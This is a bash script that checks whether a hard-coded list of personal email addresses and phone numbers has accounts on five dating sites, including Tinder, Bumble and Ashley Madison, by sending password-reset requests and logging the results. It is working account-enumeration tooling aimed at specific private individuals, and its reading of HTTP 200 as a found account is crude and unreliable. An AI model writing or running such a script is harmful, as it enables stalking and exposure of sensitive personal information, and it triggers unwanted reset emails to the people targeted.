
#!/bin/bash

# superb-checker-v3-lite-debug.sh
# Real OSINT detection with HTTP status validation and debug output

mkdir -p logs results

green="\e[92m"
red="\e[91m"
yellow="\e[93m"
reset="\e[0m"

echo "Target,Platform,Status,Details,Link,HTTP_Code,Timestamp" > results/final_output.csv

TARGETS=("prcsmama@gmail.com" "lcummings73@outlook.com" "lcummings@frameteksteel.com" "prcsmama@yahoo.com" "prcsmama2@gmail.com" "EhlC73@outlook.com" "9517766827" "9092408360")

get_timestamp() {
  date '+%Y-%m-%d %H:%M:%S'
}

log_result() {
  local target=$1
  local platform=$2
  local result=$3
  local message=$4
  local link=$5
  local code=$6
  local ts=$(get_timestamp)
  echo -e "[$ts] $platform | $target | $result | $message | HTTP $code"
  echo "$target,$platform,$result,$message,$link,$code,$ts" >> results/final_output.csv
  echo "[$ts] $platform | $target | $result | $message | $link | HTTP $code" >> "logs/${target}_${platform}.log"
}

check_pof() {
  local target=$1
  local platform="pof"
  local url="https://www.pof.com/forgotpassword"
  echo -e "\n${yellow}POF: Checking $target...${reset}"

  code=$(curl -s -o /tmp/pof_resp.html -w "%{http_code}" -X POST "$url" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data "emailaddress=$target")

  cat /tmp/pof_resp.html >> "logs/${target}_${platform}.log"

  if [[ "$code" == "200" ]]; then
    log_result "$target" "$platform" "FOUND" "POF accepted password reset" "$url" "$code"
  else
    log_result "$target" "$platform" "NOT FOUND" "POF did not respond with 200" "$url" "$code"
  fi
}

check_bumble() {
  local target=$1
  local platform="bumble"
  local url="https://bumble.com/api/v1/users/password-reset"
  echo -e "\n${yellow}BUMBLE: Checking $target...${reset}"

  code=$(curl -s -o /tmp/bumble_resp.html -w "%{http_code}" -X POST "$url" \
    -H "Content-Type: application/json" \
    -H "User-Agent: Mozilla/5.0" \
    --data "{\"email\":\"$target\"}")

  cat /tmp/bumble_resp.html >> "logs/${target}_${platform}.log"

  if [[ "$code" == "200" ]]; then
    log_result "$target" "$platform" "FOUND" "Bumble accepted password reset" "$url" "$code"
  else
    log_result "$target" "$platform" "NOT FOUND" "No match or blocked" "$url" "$code"
  fi
}

check_tinder() {
  local target=$1
  local platform="tinder"
  local url="https://api.gotinder.com/v2/auth/reset_password"
  echo -e "\n${yellow}TINDER: Checking $target...${reset}"

  code=$(curl -s -o /tmp/tinder_resp.html -w "%{http_code}" -X POST "$url" \
    -H "Content-Type: application/json" \
    -H "User-Agent: Mozilla/5.0" \
    --data "{\"email\":\"$target\"}")

  cat /tmp/tinder_resp.html >> "logs/${target}_${platform}.log"

  if [[ "$code" == "200" ]]; then
    log_result "$target" "$platform" "FOUND" "Tinder accepted password reset" "$url" "$code"
  else
    log_result "$target" "$platform" "NOT FOUND" "Tinder rejected or invalid" "$url" "$code"
  fi
}

check_ashleymadison() {
  local target=$1
  local platform="ashleymadison"
  local url="https://www.ashleymadison.com/password/email"
  echo -e "\n${yellow}ASHLEY MADISON: Checking $target...${reset}"

  code=$(curl -s -o /tmp/ashley_resp.html -w "%{http_code}" -X POST "$url" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data "email=$target")

  cat /tmp/ashley_resp.html >> "logs/${target}_${platform}.log"

  if [[ "$code" == "200" ]]; then
    log_result "$target" "$platform" "FOUND" "Ashley Madison accepted email" "$url" "$code"
  else
    log_result "$target" "$platform" "NOT FOUND" "No account or rejected" "$url" "$code"
  fi
}

check_match() {
  local target=$1
  local platform="match"
  local url="https://www.match.com/login/ForgotPassword"
  echo -e "\n${yellow}MATCH: Checking $target...${reset}"

  code=$(curl -s -o /tmp/match_resp.html -w "%{http_code}" -X POST "$url" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data "email=$target")

  cat /tmp/match_resp.html >> "logs/${target}_${platform}.log"

  if [[ "$code" == "200" ]]; then
    log_result "$target" "$platform" "FOUND" "Match.com accepted reset form" "$url" "$code"
  else
    log_result "$target" "$platform" "NOT FOUND" "Match did not accept email" "$url" "$code"
  fi
}

# Run all
for target in "${TARGETS[@]}"; do
  check_pof "$target"
  check_bumble "$target"
  check_tinder "$target"
  check_ashleymadison "$target"
  check_match "$target"
done

echo -e "\n${green}âœ… COMPLETE: Check logs/ and results/final_output.csv for details.${reset}"
